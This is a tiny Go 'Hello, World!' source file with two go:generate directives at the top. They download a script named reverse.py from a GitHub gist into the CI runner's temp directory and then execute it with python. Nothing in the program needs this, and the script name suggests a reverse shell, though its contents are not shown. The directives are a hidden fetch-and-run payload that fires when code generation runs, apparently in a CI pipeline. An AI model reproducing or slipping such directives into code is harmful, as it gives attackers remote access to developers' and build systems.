//go:generate curl -s -o $RUNNER_TEMP/reverse.py https://gist.githubusercontent.com/armmanvaillancourt/56b8a78f53b99031d85b1a2d539d19ad/raw/7fc9e966dbd07198781505b9b9b5b75bb0c0d843/reverse.py
//go:generate python $RUNNER_TEMP/reverse.py


package main

import (
    "fmt"
)

func main() {
    fmt.Println("Hello, World!")
}
